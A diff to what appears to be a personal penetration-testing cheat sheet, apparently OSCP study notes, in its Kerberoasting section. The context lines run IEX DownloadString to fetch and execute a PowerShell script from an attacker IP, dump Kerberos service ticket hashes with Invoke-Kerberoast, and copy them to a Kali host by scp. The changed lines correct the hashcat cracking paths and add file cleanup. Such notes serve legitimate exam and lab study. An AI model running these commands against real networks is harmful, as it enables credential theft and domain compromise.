@@ -1200,8 +1200,13 @@ IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/I
 Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash
 Invoke-Kerberoast -OutputFormat HashCat |Select-Object -ExpandProperty hash | out-file -Encoding ASCII myhashes.txt 
 scp myhashes.txt kali@172.16.99.209:/tmp/
-hashcat -m 13100 /tmp/hash1.txt -a 0 10k-worst-pass.txt
-hashcat -m 13100 /tmp/hash1.txt -a 0 10k-worst-pass.txt --show
+hashcat -m 13100 /tmp/myhashes.txt -a 0 10k-worst-pass.txt
+hashcat -m 13100 /tmp/myhashes.txt -a 0 10k-worst-pass.txt --show
+```
+TALVEZ
+```
+cat /tmp/myhashes.txt
+dos2unix /tmp/myhashes.txt
 ```
 
 ## KERBEROASTING-ASREP
